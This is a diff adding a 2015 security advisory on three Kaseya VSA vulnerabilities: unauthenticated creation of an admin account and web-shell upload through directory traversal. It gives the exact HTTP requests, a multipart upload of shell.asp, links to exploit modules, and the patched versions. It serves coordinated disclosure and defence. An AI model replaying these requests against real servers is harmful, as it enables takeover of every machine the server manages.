@@ -1,0 +1,167 @@
+Kaseya VSA is an IT management platform for small and medium corporates.
+From its console you can control thousands of computers and mobile
+devices. So that if you own the Kaseya server, you own the organisation.
+With this post I'm also releasing two Metasploit modules ([E1], [E2])
+and a Ruby file ([E3]) that exploit the vulnerabilities described below.
+
+A special thanks to ZDI for assisting with the disclosure of these
+vulnerabilities. The full advisory text is below, but can also be
+obtained from my repo at [E4].
+
+[E1] https://github.com/rapid7/metasploit-framework/pull/6018
+[E2] https://github.com/rapid7/metasploit-framework/pull/6019
+[E3] https://raw.githubusercontent.com/pedrib/PoC/master/exploits/kazPwn.rb
+[E4]
+https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vs
+a-vuln-2.txt
+
+Regards,
+Pedro
+
+============
+
+>> Multiple vulnerabilities in Kaseya Virtual System Administrator
+>> Discovered by Pedro Ribeiro (pedrib (at) gmail (dot) com [email concealed]), Agile Information
+Security (http://www.agileinfosec.co.uk/)
+========================================================================
+==
+Disclosure: 23/09/2015 / Last updated: 28/09/2015
+
+>> Background on the affected product:
+"Kaseya VSA is an integrated IT Systems Management platform that can be
+leveraged seamlessly across IT disciplines to streamline and automate
+your IT services. Kaseya VSA integrates key management capabilities into
+a single platform. Kaseya VSA makes your IT staff more productive, your
+services more reliable, your systems more secure, and your value easier
+to show."
+
+A special thanks to ZDI for assisting with the vulnerability reporting
+process.
+These vulnerabilities were disclosed by ZDI under IDs ZDI-15-448 [1],
+ZDI-15-449 [2] and ZDI-15-450 [3] on 23/09/2015.
+
+>> Technical details:
+#1
+Vulnerability: Remote privilege escalation (add Master Administrator
+account - unauthenticated)
+CVE-2015-6922 / ZDI-15-448
+Affected versions:
+VSA Version 7.0.0.0 â?? 7.0.0.32
+VSA Version 8.0.0.0 â?? 8.0.0.22
+VSA Version 9.0.0.0 â?? 9.0.0.18
+VSA Version 9.1.0.0 â?? 9.1.0.8
+
+GET /LocalAuth/setAccount.aspx
+Page will attempt to redirect, ignore this and obtain the "sessionVal"
+value from the page which will be used in the following POST request.
+
+POST /LocalAuth/setAccount.aspx
+sessionVal=<sessionVal>&adminName=<username>&NewPassword=<password>&conf
+irm=<password>&adminEmail=bla (at) bla (dot) com [email concealed]&setAccount=Create
+
+You are now a Master Administrator and can execute code in all the
+managed desktops and mobile devices.
+A Metasploit module that exploits this vulnerability has been released.
+
+#2
+Vulnerability: Remote code execution via file upload with directory
+traversal (unauthenticated)
+CVE-2015-6922 / ZDI-15-449
+Affected versions:
+VSA Version 7.0.0.0 â?? 7.0.0.32
+VSA Version 8.0.0.0 â?? 8.0.0.22
+VSA Version 9.0.0.0 â?? 9.0.0.18
+VSA Version 9.1.0.0 â?? 9.1.0.8
+
+First we do:
+GET /ConfigTab/serverfiles.asp
+which will respond with a 302 redirect to /mainLogon.asp?logout=<sessionID>
+Thanks for creating a valid sessionID for us, Kaseya!
+
+POST
+/ConfigTab/uploader.aspx?PathData=C%3A%5CKaseya%5CWebPages%5C&qqfile=she
+ll.asp
+Cookie: sessionId=<sessionID>
+<... ASP shell here...>
+
+The path needs to be correct, but Kaseya is helpful enough to let us
+know when a path doesn't exist.
+A Metasploit module that exploits this vulnerability has been released.
+
+#3
+Vulnerability: Remote code execution via file upload with directory
+traversal (authenticated)
+CVE-2015-6589 / ZDI-15-450
+Affected versions:
+VSA Version 7.0.0.0 â?? 7.0.0.32
+VSA Version 8.0.0.0 â?? 8.0.0.22
+VSA Version 9.0.0.0 â?? 9.0.0.18
+VSA Version 9.1.0.0 â?? 9.1.0.8
+
+Login to the VSA console and obtain ReferringWebWindowId from the URL
+(wwid parameter).
+Create a POST request as below with the ReferringWebWindowId:
+
+POST /vsapres/web20/json.ashx HTTP/1.1
+Content-Type: multipart/form-data;
+boundary=---------------------------114052411119142
+Content-Length: 1501
+
+-----------------------------114052411119142
+Content-Disposition: form-data; name="directory"
+
+../WebPages
+-----------------------------114052411119142
+Content-Disposition: form-data; name="ReferringWebWindowId"
+
+31a5d16a-01b7-4f8d-adca-0b2e70006dfa
+-----------------------------114052411119142
+Content-Disposition: form-data; name="request"
+
+uploadFile
+-----------------------------114052411119142
+Content-Disposition: form-data; name="impinf__uploadfilelocation";
+filename="shell.asp"
+Content-Type: application/octet-stream
+
+<... ASP shell here...>
+
+-----------------------------114052411119142--
+
+A Ruby exploit (kazPwn.rb) that abuses this vulnerability has also been
+been released [4].
+
+>> Fix:
+V7 â?? Install patch 7.0.0.33
+R8 â?? Install patch 8.0.0.23
+R9 â?? Install patch 9.0.0.19
+R9.1 â?? Install patch 9.1.0.9
+
+>> References:
+[1] http://zerodayinitiative.com/advisories/ZDI-15-448/
+[2] http://zerodayinitiative.com/advisories/ZDI-15-449/
+[3] http://zerodayinitiative.com/advisories/ZDI-15-450/
+[4] https://raw.githubusercontent.com/pedrib/PoC/master/exploits/kazPwn.rb
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBAgAGBQJWCm9DAAoJEOToNW8ubuEaXLAQAIXcXSYwxJ5YLD0eyDxSO8z3
+Vxmzf1jKqCHgTblKfW2+AaAhV7Z6u0fcjw4axV0TiRCUJgp3RANo2DkEjbrP/Pv2
+L4Yk34FM0ijfgg5x6rG7M8496jm91iEYpoYcCpsnqE0ZN1RbQZWmqWjJHpVPcPno
+RgjNV/OHGBzaikj5BV1yaJwT/KpvV0IGUDB54ZPto8lEYtqxfYl4+zg39DQ+GlRy
+OlU+Bovj/n2AiJ52omdm1JJL3DW6rhto8FH7yRUvBeW3ofgdBHwG4Ynxk3gOAhY3
+AvD2uIs5eY5siapb7/kA8RSKKuTUYo/p80hDwhkAzVYwlrkDTl7s9gSPU/KOY04/
+ur64fhC/9TTEMONZ5PQdbrL5WSAVRTdcsCDbZ8YCbZxoexPzObhdV1qV99Go8Ny+
+pd5WCoziQtrK8r2u6v7dsfJfYnvURG7SdcD15e1oIe4OaZzEsXxbcgLEmbskhdOP
+ZmcuzkYqUfpFvaFQ3O8PMtBb8jqpkt76X4Q+0JbVG9nUzwA1nS2xoGw0Ad8NDoUi
+Nw5BxwW4Z7zCSHgBI6CYUTZQ0QvZFVZXOkix6+GnslzDwXu6m1cnY+PXa5K5jJtm
+/BMO8WVUvwPdUAeRMTweggoXOModWC/56BZNgquxTkayz2r9c7AdEr0aZDLYIxr0
+OHLrGsL5XSDW9txZqDl9
+=rF0G
+-----END PGP SIGNATURE-----
